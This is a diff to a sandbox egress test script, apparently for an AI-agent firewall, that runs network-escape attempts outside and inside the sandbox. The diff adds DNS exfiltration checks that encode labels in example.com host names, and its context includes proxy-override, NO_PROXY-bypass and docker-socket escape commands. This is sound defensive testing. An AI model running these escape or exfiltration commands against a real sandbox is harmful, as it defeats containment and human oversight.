@@ -4,6 +4,10 @@
 #   attempts.sh outside <label-prefix> <results-file>
 #   attempts.sh inside  <label-prefix> <record-prefix> <results-file> <real-workspace>
 #
+# (The record prefix labelled the DNS attempts that 2c.2 recorded without
+# asserting; since slice 2c.4 they are asserted under the label prefix, and
+# the record prefix is kept only so the command line does not change.)
+#
 # The same attempts run twice: first outside the sandbox, where each must get
 # out (the control), then inside it, where each must not. This script's own
 # exit statuses are not evidence. The judge (judge.py) reads a packet capture
@@ -85,7 +89,10 @@ note "RESULT allowed-https $? $code"
 
 # --- must block: unlisted hosts ----------------------------------------------
 try https-unlisted      curl -sS --max-time $T -o /dev/null https://example.org/
-try http-unlisted       curl -sS --max-time $T -o /dev/null http://example.net/
+# curl reads only the lower-case http_proxy for plain HTTP, and AWF sets the
+# upper-case HTTP_PROXY: name the proxy, so this goes through it inside (outside,
+# HTTP_PROXY is unset and an empty --proxy means none).
+try http-unlisted       curl -sS --max-time $T -o /dev/null --proxy "${HTTP_PROXY:-}" http://example.net/
 try noproxy-unlisted    env NO_PROXY='*' no_proxy='*' curl -sS --noproxy '*' --max-time $T -o /dev/null https://example.org/
 try proxy-override      env HTTPS_PROXY=http://208.67.220.123:443 https_proxy=http://208.67.220.123:443 curl -sS --max-time $T -o /dev/null https://example.com/
 
@@ -139,10 +146,20 @@ else
 fi
 try docker-socket       docker run --rm --network host busybox:1.37 wget -q -T $T -O /dev/null http://208.67.222.222/
 
+# --- must block: data in a host name (slice 2c.4) ----------------------------
+# The name holds the label; a DNS query for it leaving the runner would carry it.
+# The first two go to the proxy, which looks the name up before refusing it; the
+# judge also requires their names in the action's resolver's refusals, so they
+# show the resolver at work. The last two are the command's own lookups, which
+# go to Docker's resolver in the command's container and, on AWF's internal
+# network, go no further with or without the action's resolver (as in 2c.2);
+# they are asserted so that a change there is seen.
+try dns-via-proxy       curl -sS --max-time $T -o /dev/null "https://$prefix-viaproxy.example.com/"
+try dns-via-proxy-http  curl -sS --max-time $T -o /dev/null --proxy "${HTTP_PROXY:-}" "http://$prefix-plainproxy.example.com/"
+try dns-default-getent  getent ahosts "$prefix-getent.example.com"
+try dns-default-dig     dig +time=3 +tries=1 "$prefix-digdefault.example.com" A
+
 # --- recorded, not asserted --------------------------------------------------
-try dns-default-getent  getent ahosts "$record_prefix-getent.example.com"
-try dns-default-dig     dig +time=3 +tries=1 "$record_prefix-dig.example.com" A
-try dns-via-proxy       curl -sS --max-time $T -o /dev/null "https://$record_prefix-proxy.example.com/"
 code=$(curl -sS --max-time $T -o /dev/null -w '%{http_code}' -H 'Host: example.org' https://api.github.com/ 2>/dev/null)
 note "RESULT host-mismatch $? $code"
 
